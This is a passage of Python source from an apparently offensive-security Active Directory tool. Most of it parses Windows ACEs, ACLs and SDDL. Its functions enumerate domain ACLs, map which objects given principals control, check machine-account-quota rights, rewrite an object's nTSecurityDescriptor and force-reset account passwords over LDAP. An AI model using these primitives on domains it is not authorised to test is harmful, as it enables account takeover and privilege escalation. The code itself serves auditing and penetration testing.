		if self.ObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT
		if self.InheritedObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT

		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Flags.to_bytes(4, 'little', signed = False)
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			t += self.ObjectType.to_bytes()
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			t += self.InheritedObjectType.to_bytes()

		t += self.Sid.to_bytes()
		t += self.ApplicationData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class SYSTEM_AUDIT_CALLBACK_ACE:
	def __init__(self):
		self.AceType = ACEType.SYSTEM_AUDIT_CALLBACK_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None
		self.ApplicationData = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = SYSTEM_AUDIT_CALLBACK_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		ace.ApplicationData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t += self.ApplicationData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class SYSTEM_AUDIT_CALLBACK_OBJECT_ACE:
	def __init__(self):
		self.AceType = ACEType.SYSTEM_AUDIT_CALLBACK_OBJECT_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Flags = None
		self.ObjectType = None
		self.InheritedObjectType = None
		self.Sid = None
		self.ApplicationData = None

		self.sd_object_type = None
	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = SYSTEM_AUDIT_CALLBACK_OBJECT_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Flags = ACE_OBJECT_PRESENCE(int.from_bytes(buff.read(4), 'little', signed = False))
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			ace.ObjectType = GUID.from_buffer(buff)
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			ace.InheritedObjectType = GUID.from_buffer(buff)
		ace.Sid = SID.from_buffer(buff)
		ace.ApplicationData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
		if self.ObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT
		if self.InheritedObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT

		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Flags.to_bytes(4, 'little', signed = False)
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			t += self.ObjectType.to_bytes()
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			t += self.InheritedObjectType.to_bytes()

		t += self.Sid.to_bytes()
		t += self.ApplicationData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class SYSTEM_MANDATORY_LABEL_ACE:
	def __init__(self):
		self.AceType = ACEType.SYSTEM_MANDATORY_LABEL_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		ace = SYSTEM_MANDATORY_LABEL_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class SYSTEM_RESOURCE_ATTRIBUTE_ACE:
	def __init__(self):
		self.AceType = ACEType.SYSTEM_RESOURCE_ATTRIBUTE_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None
		self.AttributeData = None #must be bytes for now. structure is TODO (see top of file)

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = SYSTEM_RESOURCE_ATTRIBUTE_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		ace.AttributeData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t += self.AttributeData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class SYSTEM_SCOPED_POLICY_ID_ACE:
	def __init__(self):
		self.AceType = ACEType.SYSTEM_SCOPED_POLICY_ID_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		ace = SYSTEM_SCOPED_POLICY_ID_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

ACEType2ACE = {
	ACEType.ACCESS_ALLOWED_ACE_TYPE : ACCESS_ALLOWED_ACE,
	ACEType.ACCESS_DENIED_ACE_TYPE : ACCESS_DENIED_ACE,
	ACEType.SYSTEM_AUDIT_ACE_TYPE : SYSTEM_AUDIT_ACE,
	ACEType.SYSTEM_ALARM_ACE_TYPE : SYSTEM_ALARM_ACE,
	ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE : ACCESS_ALLOWED_OBJECT_ACE,
	ACEType.ACCESS_DENIED_OBJECT_ACE_TYPE : ACCESS_DENIED_OBJECT_ACE,
	ACEType.SYSTEM_AUDIT_OBJECT_ACE_TYPE : SYSTEM_AUDIT_OBJECT_ACE,
	ACEType.ACCESS_ALLOWED_CALLBACK_ACE_TYPE : ACCESS_ALLOWED_CALLBACK_ACE,
	ACEType.ACCESS_DENIED_CALLBACK_ACE_TYPE : ACCESS_DENIED_CALLBACK_ACE,
	ACEType.ACCESS_ALLOWED_CALLBACK_OBJECT_ACE_TYPE : ACCESS_ALLOWED_CALLBACK_OBJECT_ACE,
	ACEType.ACCESS_DENIED_CALLBACK_OBJECT_ACE_TYPE : ACCESS_DENIED_CALLBACK_OBJECT_ACE,
	ACEType.SYSTEM_AUDIT_CALLBACK_ACE_TYPE : SYSTEM_AUDIT_CALLBACK_ACE,
	ACEType.SYSTEM_AUDIT_CALLBACK_OBJECT_ACE_TYPE : SYSTEM_AUDIT_CALLBACK_OBJECT_ACE,
	ACEType.SYSTEM_MANDATORY_LABEL_ACE_TYPE : SYSTEM_MANDATORY_LABEL_ACE,
	ACEType.SYSTEM_RESOURCE_ATTRIBUTE_ACE_TYPE : SYSTEM_RESOURCE_ATTRIBUTE_ACE,
	ACEType.SYSTEM_SCOPED_POLICY_ID_ACE_TYPE : SYSTEM_SCOPED_POLICY_ID_ACE,
	# ACEType.ACCESS_ALLOWED_COMPOUND_ACE_TYPE : , # Reserved
	# ACEType.SYSTEM_ALARM_OBJECT_ACE_TYPE : , # Reserved
	# ACEType.SYSTEM_ALARM_CALLBACK_ACE_TYPE : , # Reserved
	# ACEType.SYSTEM_ALARM_CALLBACK_OBJECT_ACE_TYPE : , # Reserved
}

#######################################################################
#                     Access Control List (ACL)                       #
#######################################################################

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/20233ed8-a6c6-4097-aafa-dd545ed24428
class ACL_REVISION(enum.Enum):
	NO_DS = 0x02 # When set to 0x02, only AceTypes 0x00, 0x01, 0x02, 0x03, 0x11, 0x12, and 0x13 can be present in the ACL. An AceType of 0x11 is used for SACLs but not for DACLs. For more information about ACE types, see section 2.4.4.1.
	DS = 0x04 # When set to 0x04, AceTypes 0x05, 0x06, 0x07, 0x08, and 0x11 are allowed. ACLs of revision 0x04 are applicable only to directory service objects. An AceType of 0x11 is used for SACLs but not for DACLs.
ACL_REV_NODS_ALLOWED_TYPES = [0x00, 0x01, 0x02, 0x03, 0x11, 0x12, 0x13]
ACL_REV_DS_ALLOWED_TYPES   = [0x05, 0x06, 0x07, 0x08, 0x11]

# https://learn.microsoft.com/fr-fr/windows/win32/api/winnt/ns-winnt-acl
class ACL:
	def __init__(self, sd_object_type = None):
		self.AclRevision = None
		self.Sbz1 = 0
		self.AclSize = None
		self.AceCount = None
		self.Sbz2 = 0

		self.aces = []
		self.sd_object_type = sd_object_type

	@staticmethod
	def from_buffer(buff, sd_object_type = None):
		acl = ACL(sd_object_type)
		acl.AclRevision = int.from_bytes(buff.read(1), 'little', signed = False)
		acl.Sbz1 = int.from_bytes(buff.read(1), 'little', signed = False)
		acl.AclSize = int.from_bytes(buff.read(2), 'little', signed = False)
		acl.AceCount = int.from_bytes(buff.read(2), 'little', signed = False)
		acl.Sbz2 = int.from_bytes(buff.read(2), 'little', signed = False)
		for _ in range(acl.AceCount):
			acl.aces.append(ACE.from_buffer(buff, sd_object_type))
		return acl

	def to_bytes(self):
		buff = io.BytesIO()
		self.to_buffer(buff)
		buff.seek(0)
		return buff.read()

	def to_buffer(self, buff):
		data_buff = io.BytesIO()

		self.AceCount = len(self.aces)
		for ace in self.aces:
			ace.to_buffer(data_buff)

		self.AclSize = 8 + data_buff.tell()

		buff.write(self.AclRevision.to_bytes(1, 'little', signed = False))
		buff.write(self.Sbz1.to_bytes(1, 'little', signed = False))
		buff.write(self.AclSize.to_bytes(2, 'little', signed = False))
		buff.write(self.AceCount.to_bytes(2, 'little', signed = False))
		buff.write(self.Sbz2.to_bytes(2, 'little', signed = False))
		data_buff.seek(0)
		buff.write(data_buff.read())

	def to_sddl(self, ace_rights_adcs = False, object_type = None):
		t = ''
		for ace in self.aces:
			t += ace.to_sddl(ace_rights_adcs, object_type)
		return t

	@staticmethod
	def from_sddl(sddl_str, ace_rights_adcs = False, object_type = None, domain_sid = None):
		acl = ACL()
		acl.AclRevision = 2
		acl.AceCount = 0

		for ace_sddl in sddl_str.split(')('):
			ace = ACE.from_sddl(ace_sddl, ace_rights_adcs = ace_rights_adcs, object_type = object_type, domain_sid = domain_sid)
			acl.aces.append(ace)
			acl.AceCount += 1
			if acl.AclRevision == 2:
				if ace.AceType.value in ACL_REV_DS_ALLOWED_TYPES:
					acl.AclRevision = ACL_REVISION.DS.value

		return acl

def flatten_dict(d):
	items = []
	if isinstance(d, list):
		for item in d:
			if isinstance(item, dict):
				items.extend(flatten_dict(item))
			else:
				items.append(item)
	elif isinstance(d, dict):
		for key, value in d.items():
			items.append(key)
			if isinstance(value, list):
				for item in value:
					if isinstance(item, dict):
						items.extend(flatten_dict(item))
					else:
						items.append(item)
			elif isinstance(value, dict):
				items.extend(flatten_dict(value))
			else:
				items.append(value)
	else:
		items.append(value)

	return items

def listACLs(conn, server, descriptorAttributes = ["nTSecurityDescriptor", "msDS-GroupMSAMembership", "msExchMailboxSecurityDescriptor"]):
	print_yellow("[*] Listing all ACLs")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		controls = security_descriptor_control(sdflags = SD_FLAGS_CONTROL.OWNER_SECURITY_INFORMATION + SD_FLAGS_CONTROL.GROUP_SECURITY_INFORMATION + SD_FLAGS_CONTROL.DACL_SECURITY_INFORMATION)
		entry_generator = search(conn, server, attributes = ["distinguishedName"] + descriptorAttributes, controls = controls)
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				NtSecurityDescriptor = []
				if "nTSecurityDescriptor" in descriptorAttributes:
					NtSecurityDescriptor = entry["raw_attributes"]["nTSecurityDescriptor"]
				msDSGroupMSAMembership = []
				if "msDS-GroupMSAMembership" in descriptorAttributes:
					msDSGroupMSAMembership = entry["raw_attributes"]["msDS-GroupMSAMembership"]
				msExchMailboxSecurityDescriptor = []
				if "msExchMailboxSecurityDescriptor" in descriptorAttributes:
					msExchMailboxSecurityDescriptor = entry["raw_attributes"]["msExchMailboxSecurityDescriptor"]
				dn = entry["raw_attributes"]["distinguishedName"]
				if dn != []:
					dn = dn[0].decode()
				else:
					dn = "<Unknown>"
				if NtSecurityDescriptor != []:
					NtSecurityDescriptor = NtSecurityDescriptor[0]
					sd = SECURITY_DESCRIPTOR.from_bytes(NtSecurityDescriptor)
					isCA = False
					if dn.startswith("CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,"):
						isCA = True
					print(f"[+] ACL from nTSecurityDescriptor for '{dn}'")
					parseDACL(conn, server, sd, isCA, indent = 1)
				if msDSGroupMSAMembership != []:
					msDSGroupMSAMembership = msDSGroupMSAMembership[0]
					sd = SECURITY_DESCRIPTOR.from_bytes(NtSecurityDescriptor)
					print(f"[+] ACL from msDS-GroupMSAMembership for '{dn}'")
					parseDACL(conn, server, sd, False, indent = 1, isGMSA = True)
				if msExchMailboxSecurityDescriptor != []:
					msExchMailboxSecurityDescriptor = msExchMailboxSecurityDescriptor[0]
					sd = SECURITY_DESCRIPTOR.from_bytes(msExchMailboxSecurityDescriptor)
					print(f"[+] ACL from msExchMailboxSecurityDescriptor for '{dn}'")
					parseDACL(conn, server, sd, False, indent = 1)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listACLTrusts(conn, server, ip, user, pwd, domain, nthash, aesKey, ccache, objects, recursive, searchVulnerable, descriptorAttributes = ["nTSecurityDescriptor", "msDS-GroupMSAMembership", "msExchMailboxSecurityDescriptor"]):
	print_yellow("[*] Listing trusted AD objects")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		if (recursive):
			print("[+] Searching provided AD objects' memberships")
			objects = getMemberOfs(conn, server, objects)
			if (len(objects) == 0):
				print("\t[-] Provided AD objects does not exist", file = sys.stderr)
				return
			else:
				print_nested_dict(objects, indent = 1)

		# Get SIDs from samAccountName, name or distinguishedName
		sids = getSIDs(conn, server, flatten_dict(objects))
		if len(sids) == 0:
			print("[-] Failed to get SIDs of provided AD objects", file = sys.stderr)
			return
		if (recursive):
			# Authenticated Users, Everyone: Not listed in LDAP but every users and groups belong to that group
			sids["S-1-5-11"] = "Authenticated Users"
			sids["S-1-1-0"] = "Everyone"
		
		# Adding Domain Computers group to sids if MAQ > 0 (default = 10) and provided SIDs can add computers
		entry_generator = search(conn, server, filter = "(objectClass=domainDNS)", attributes = ["ms-DS-MachineAccountQuota", "objectSID"])
		maq = None
		domainComputersSID = None
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				maq = int(entry["raw_attributes"]["ms-DS-MachineAccountQuota"][0])
				objectSID = entry["raw_attributes"]["objectSID"]
				domainSID = SID.from_bytes(objectSID[0]).__str__()
				domainComputersSID = domainSID + "-515"
				break
		if domainComputersSID not in sids.keys():
			print("[+] Check if MAQ > 0 and provided SIDs can add computers")
			if maq > 0:
				print(f"\t[+] MAQ = {maq}")

				# Search if provided SIDs can add computers from GPO 'Default Domain Controllers Policy' ({6AC1786C-016F-11D2-945F-00C04fB984F9})
				guid = "{6AC1786C-016F-11D2-945F-00C04fB984F9}"
				originalSTDOUT = sys.stdout
				originalSTDERR = sys.stderr
				sys.stdout = StringIO()
				sys.stderr = StringIO()
				try:
					connSMB = SMBUtil.connect_smb(ip, user, pwd, domain, nthash, aesKey, ccache)
					if connSMB == '':
						sys.stdout = originalSTDOUT
						sys.stderr = originalSTDERR
						print("\t[-] Failed to get SMB connection. Domain computers not added to SIDs", file = sys.stderr)
					else:
						targetDomainDN = server.info.other['defaultNamingContext'][0]
						targetDomain = targetDomain = ('.'.join([x.strip("DC=") for x in targetDomainDN.split(",")])).lower()
						gpoPath = f'{targetDomain}/Policies/{guid}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf'
						gpoContent = SMBUtil.readFile(connSMB, 'SYSVOL', gpoPath, True)
						lines = gpoContent.splitlines()
						canAddComputers = False

						sys.stdout = originalSTDOUT
						sys.stderr = originalSTDERR
						for line in lines:
							if line.startswith("SeMachineAccountPrivilege = "):
								for sid in sids.keys():
									if line.find(sid) != -1:
										canAddComputers = True
										print(f"\t[+] {sids[sid]} can add computers. Adding domain computers to SIDs")
										sids[domainComputersSID] = "Domain Computers"
										break
						if not canAddComputers:
							print("\t[-] No provided objects can add computers. Domain computers not added to SIDs", file = sys.stderr)
				except:
					sys.stdout = originalSTDOUT
					sys.stderr = originalSTDERR
					print("\t[-] Failed to read GPO Default Domain Controllers Policy. Domain computers not added to SIDs", file = sys.stderr)
			else: # Cannot add computers to domain. Pass
				print(f"\t[-] MAQ = {maq}. Domain computers not added to SIDs")

		print("[+] Current mapping")
		for key, val in sids.items():
			print(f"\t[+] {key}: {val}")

		controls = security_descriptor_control(sdflags = SD_FLAGS_CONTROL.OWNER_SECURITY_INFORMATION + SD_FLAGS_CONTROL.GROUP_SECURITY_INFORMATION + SD_FLAGS_CONTROL.DACL_SECURITY_INFORMATION)
		entry_generator = search(conn, server, attributes = ["objectClass", "distinguishedName"] + descriptorAttributes, controls = controls)
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				NtSecurityDescriptor = []
				if "nTSecurityDescriptor" in descriptorAttributes:
					NtSecurityDescriptor = entry["raw_attributes"]["nTSecurityDescriptor"]
				msDSGroupMSAMembership = []
				if "msDS-GroupMSAMembership" in descriptorAttributes:
					msDSGroupMSAMembership = entry["raw_attributes"]["msDS-GroupMSAMembership"]
				msExchMailboxSecurityDescriptor = []
				if "msExchMailboxSecurityDescriptor" in descriptorAttributes:
					msExchMailboxSecurityDescriptor = entry["raw_attributes"]["msExchMailboxSecurityDescriptor"]
				objectClass = entry["raw_attributes"]["objectClass"]
				dn = entry["raw_attributes"]["distinguishedName"]
				if dn != []:
					dn = dn[0].decode()
				else:
					dn = "<Unknown>"
				if NtSecurityDescriptor != []:
					NtSecurityDescriptor = NtSecurityDescriptor[0]
					sd = SECURITY_DESCRIPTOR.from_bytes(NtSecurityDescriptor)
					isCA = False
					if dn.startswith("CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,"):
						isCA = True
					parseDACL(conn, server, sd, isCA, dn, sids, searchVulnerable = searchVulnerable, objectClass = objectClass)
				if msDSGroupMSAMembership != []:
					msDSGroupMSAMembership = msDSGroupMSAMembership[0]
					sd = SECURITY_DESCRIPTOR.from_bytes(msDSGroupMSAMembership)
					parseDACL(conn, server, sd, False, dn, sids, searchVulnerable = searchVulnerable, isGMSA = True, objectClass = objectClass)
				if msExchMailboxSecurityDescriptor != []:
					msExchMailboxSecurityDescriptor = msExchMailboxSecurityDescriptor[0]
					sd = SECURITY_DESCRIPTOR.from_bytes(msExchMailboxSecurityDescriptor)
					parseDACL(conn, server, sd, False, dn, sids, searchVulnerable = searchVulnerable, objectClass = objectClass)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getACL(conn, server, objects, descriptorAttributes = ["nTSecurityDescriptor", "msDS-GroupMSAMembership", "msExchMailboxSecurityDescriptor"]):
	print_yellow("[*] Listing ACL for the provided AD objects")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		dns = getDNs(conn, server, objects)
		
		if len(dns) == 0:
			print("[-] Provided AD object(s) not found", file = sys.stderr)
			return

		for dn in dns:
			controls = security_descriptor_control(sdflags = SD_FLAGS_CONTROL.OWNER_SECURITY_INFORMATION + SD_FLAGS_CONTROL.GROUP_SECURITY_INFORMATION + SD_FLAGS_CONTROL.DACL_SECURITY_INFORMATION)
			escaped_object = escape_filter_chars(dn)
			entry_generator = search(conn, server, escaped_object, f"(distinguishedName={escaped_object})", attributes = ["distinguishedName"] + descriptorAttributes, controls = controls)
			for entry in entry_generator:
				if entry["type"] == "searchResEntry":
					NtSecurityDescriptor = []
					if "nTSecurityDescriptor" in descriptorAttributes:
						NtSecurityDescriptor = entry["raw_attributes"]["nTSecurityDescriptor"]
					msDSGroupMSAMembership = []
					if "msDS-GroupMSAMembership" in descriptorAttributes:
						msDSGroupMSAMembership = entry["raw_attributes"]["msDS-GroupMSAMembership"]
					msExchMailboxSecurityDescriptor = []
					if "msExchMailboxSecurityDescriptor" in descriptorAttributes:
						msExchMailboxSecurityDescriptor = entry["raw_attributes"]["msExchMailboxSecurityDescriptor"]
					if NtSecurityDescriptor != []:
						NtSecurityDescriptor = NtSecurityDescriptor[0]
						sd = SECURITY_DESCRIPTOR.from_bytes(NtSecurityDescriptor)
						isCA = False
						if dn.startswith("CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,"):
							isCA = True
						sddl = sd.to_sddl(isCA)
						print(f"[+] ACL from nTSecurityDescriptor for '{dn}'")
						print(f"\t[+] SDDL = {sddl}")
						parseDACL(conn, server, sd, isCA, indent = 1)
					if msDSGroupMSAMembership != []:
						msDSGroupMSAMembership = msDSGroupMSAMembership[0]
						sd = SECURITY_DESCRIPTOR.from_bytes(msDSGroupMSAMembership)
						sddl = sd.to_sddl(False)
						print(f"[+] ACL from msDS-GroupMSAMembership for '{dn}'")
						print(f"\t[+] SDDL = {sddl}")
						parseDACL(conn, server, sd, False, isGMSA = True, indent = 1)
					if msExchMailboxSecurityDescriptor != []:
						msExchMailboxSecurityDescriptor = msExchMailboxSecurityDescriptor[0]
						sd = SECURITY_DESCRIPTOR.from_bytes(msExchMailboxSecurityDescriptor)
						sddl = sd.to_sddl(False)
						print(f"[+] ACL from msExchMailboxSecurityDescriptor for '{dn}'")
						print(f"\t[+] SDDL = {sddl}")
						parseDACL(conn, server, sd, False, indent = 1)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def setACL(conn, server, object, sddlStr, sdFlags = None):
	print_yellow("[*] Set ACL for the provided AD object")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		dns = getDNs(conn, server, [object])

		if len(dns) == 0:
			print("[-] Provided AD object not found", file = sys.stderr)
			return

		sd = SECURITY_DESCRIPTOR.from_sddl(sddlStr)
		sdBytes = sd.to_bytes()
		
		if sdFlags == None:
			controls = security_descriptor_control(sdflags = 7) # Request to edit all Security Descriptor parts except SACL
		else:
			sdFlagsVal = 0
			for flag in sdFlags.split(','):
				sdFlagsVal += SD_FLAGS_CONTROL_MAP[flag]
			controls = security_descriptor_control(sdflags = sdFlagsVal)
		
		dn = dns[0]
		res = writeBytes(conn, dn, "nTSecurityDescriptor", sdBytes, controls)
		if res['result'] == 0:
			print(f"[+] ACL successfully edited for '{object}'")
		else:
			print(f"[-] Failed to edit '{object}' nTSecurityDescriptor: {res}", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def resetPwd(conn, server, object, oldPwdB64, newPwdB64):
	print_yellow("[*] Reset account password")
	print_yellow("---")
	print()

	# Requires User-Force-Change-Password right on the account or old password
	# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		dns = getDNs(conn, server, [object])

		if len(dns) == 0:
			print("[-] Provided AD object not found", file = sys.stderr)
			return
		
		if (conn.server.tls == None):
			print("[-] Encrypted LDAP connection required (LDAPS or LDAP with Start-TLS)", file = sys.stderr)
			return

		if oldPwdB64 != '':
			oldPwd = '"' + base64.b64decode(oldPwdB64).decode() + '"' # It has to be double-quote delimited ...
			newPwd = '"' + base64.b64decode(newPwdB64).decode() + '"' # It has to be double-quote delimited ...
			conn.modify(dns[0], {'unicodePwd': [(MODIFY_DELETE, [oldPwd.encode("utf-16le")]), (MODIFY_REPLACE, [newPwd.encode("utf-16le")])]})
		else:
			newPwd = '"' + base64.b64decode(newPwdB64).decode() + '"' # It has to be double-quote delimited ...
			conn.modify(dns[0], {'unicodePwd': [(MODIFY_REPLACE, [newPwd.encode("utf-16le")])]})
		res = conn.result
		if res['result'] == 0:
			print("[+] Password successfully edited")
		else:
			print(f"[-] Failed to edit password: {res}", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#################################################################
#                     Security Descriptor                       #
#################################################################

# https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/security-descriptor-control
class SE_SACL(enum.IntFlag):
	SE_DACL_AUTO_INHERIT_REQ = 0x0100 	# Indicates a required security descriptor in which the discretionary access control list (DACL) is set up to support automatic propagation of inheritable access control entries (ACEs) to existing child objects.
										# For access control lists (ACLs) that support auto inheritance, this bit is always set. Protected servers can call the ConvertToAutoInheritPrivateObjectSecurity function to convert a security descriptor and set this flag.
	SE_DACL_AUTO_INHERITED = 0x0400     # Indicates a security descriptor in which the discretionary access control list (DACL) is set up to support automatic propagation of inheritable access control entries (ACEs) to existing child objects.
										# For access control lists (ACLs) that support auto inheritance, this bit is always set. Protected servers can call the ConvertToAutoInheritPrivateObjectSecurity function to convert a security descriptor and set this flag.
	SE_DACL_DEFAULTED = 0x0008			# Indicates a security descriptor with a default DACL. For example, if the creator an object does not specify a DACL, the object receives the default DACL from the access token of the creator. This flag can affect how the system treats the DACL with respect to ACE inheritance. The system ignores this flag if the SE_DACL_PRESENT flag is not set.
										# This flag is used to determine how the final DACL on the object is to be computed and is not stored physically in the security descriptor control of the securable object.
										# To set this flag, use the SetSecurityDescriptorDacl function.
	SE_DACL_PRESENT = 0x0004			# Indicates a security descriptor that has a DACL. If this flag is not set, or if this flag is set and the DACL is NULL, the security descriptor allows full access to everyone.
